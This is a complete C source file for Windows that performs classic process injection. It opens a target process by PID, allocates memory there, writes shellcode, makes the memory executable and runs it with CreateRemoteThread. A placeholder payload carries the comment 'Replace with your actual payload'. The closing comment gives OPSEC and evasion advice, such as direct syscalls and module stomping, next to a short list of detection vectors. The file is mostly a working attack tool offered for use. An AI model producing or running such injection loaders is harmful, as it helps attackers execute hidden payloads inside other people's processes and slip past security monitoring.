// @desc Classic CreateRemoteThread process injection pattern in C
/*
 * Process Injection Snippet
 * =========================
 * Technique: VirtualAllocEx → WriteProcessMemory → CreateRemoteThread
 * Platform: Windows
 * Language: C
 * Purpose:  Inject shellcode into target process
 *
 * Compile: gcc -o inject.exe process-injection.c -lkernel32
 * Usage:   inject.exe <target_pid>
 */

#include <windows.h>
#include <stdio.h>

// Function pointer type for our shellcode
typedef DWORD (WINAPI* SHELLCODE_FUNC)();

// Example shellcode (MessageBox "Hello World")
// Replace with your actual payload
unsigned char shellcode[] = {
    0x48, 0x83, 0xEC, 0x28,           // sub rsp, 28h
    0x48, 0x31, 0xC9,                 // xor rcx, rcx
    0x48, 0x31, 0xD2,                 // xor rdx, rdx
    0x4D, 0x31, 0xC0,                 // xor r8, r8
    0x4D, 0x31, 0xC9,                 // xor r9, r9
    0xFF, 0x15, 0x02, 0x00, 0x00, 0x00, // call qword ptr [rip+2]
    0xEB, 0x08,                       // jmp +8
    // MessageBoxA address would be here in real shellcode
    0x48, 0x83, 0xC4, 0x28,           // add rsp, 28h
    0xC3                              // ret
};

BOOL InjectShellcode(DWORD dwPid, unsigned char* payload, SIZE_T payloadSize)
{
    HANDLE hProcess = NULL;
    LPVOID lpRemoteBuffer = NULL;
    HANDLE hThread = NULL;
    BOOL bResult = FALSE;

    printf("[*] Opening target process (PID: %d)\n", dwPid);

    // Open target process with required permissions
    hProcess = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        FALSE,
        dwPid
    );

    if (hProcess == NULL) {
        printf("[-] OpenProcess failed: %d\n", GetLastError());
        goto cleanup;
    }

    printf("[*] Allocating memory in target process\n");

    // Allocate memory in target process (RW initially for OPSEC)
    lpRemoteBuffer = VirtualAllocEx(
        hProcess,
        NULL,
        payloadSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE  // Start as RW, change to RX later
    );

    if (lpRemoteBuffer == NULL) {
        printf("[-] VirtualAllocEx failed: %d\n", GetLastError());
        goto cleanup;
    }

    printf("[*] Writing shellcode to allocated memory\n");

    // Write shellcode to allocated memory
    if (!WriteProcessMemory(hProcess, lpRemoteBuffer, payload, payloadSize, NULL)) {
        printf("[-] WriteProcessMemory failed: %d\n", GetLastError());
        goto cleanup;
    }

    printf("[*] Changing memory protection to RX\n");

    // Change memory protection to executable (avoid RWX)
    DWORD dwOldProtect;
    if (!VirtualProtectEx(hProcess, lpRemoteBuffer, payloadSize, PAGE_EXECUTE_READ, &dwOldProtect)) {
        printf("[-] VirtualProtectEx failed: %d\n", GetLastError());
        goto cleanup;
    }

    printf("[*] Creating remote thread\n");

    // Create remote thread to execute shellcode
    hThread = CreateRemoteThread(
        hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)lpRemoteBuffer,
        NULL,
        0,
        NULL
    );

    if (hThread == NULL) {
        printf("[-] CreateRemoteThread failed: %d\n", GetLastError());
        goto cleanup;
    }

    printf("[+] Injection successful! Thread ID: %d\n", GetThreadId(hThread));

    // Wait for thread to complete (optional)
    WaitForSingleObject(hThread, INFINITE);

    bResult = TRUE;

cleanup:
    if (hThread) CloseHandle(hThread);
    if (hProcess) CloseHandle(hProcess);

    return bResult;
}

int main(int argc, char* argv[])
{
    if (argc != 2) {
        printf("Usage: %s <target_pid>\n", argv[0]);
        return 1;
    }

    DWORD dwPid = (DWORD)atoi(argv[1]);

    if (dwPid == 0) {
        printf("[-] Invalid PID\n");
        return 1;
    }

    printf("[*] Starting process injection\n");
    printf("[*] Target PID: %d\n", dwPid);
    printf("[*] Shellcode size: %zu bytes\n", sizeof(shellcode));

    if (InjectShellcode(dwPid, shellcode, sizeof(shellcode))) {
        printf("[+] Injection completed successfully\n");
        return 0;
    } else {
        printf("[-] Injection failed\n");
        return 1;
    }
}

/*
 * OPSEC Considerations:
 *
 * 1. RW → RX Memory: Avoid PAGE_EXECUTE_READWRITE allocations
 * 2. Target Selection: Avoid injecting into system processes
 * 3. API Sequence: VirtualAllocEx → WriteProcessMemory → CreateRemoteThread is well-known
 * 4. Alternative Techniques: Consider QueueUserAPC, SetWindowsHookEx, or manual DLL injection
 * 5. Error Handling: Real malware fails silently, this is for educational purposes
 *
 * Detection Vectors:
 * - Sysmon Event ID 8 (CreateRemoteThread)
 * - Suspicious memory allocations in other processes
 * - Cross-process write operations
 *
 * Evasion Ideas:
 * - Use different injection techniques (APC, Thread Pool, etc.)
 * - Implement direct syscalls instead of Win32 APIs
 * - Use module stomping instead of new allocations
 */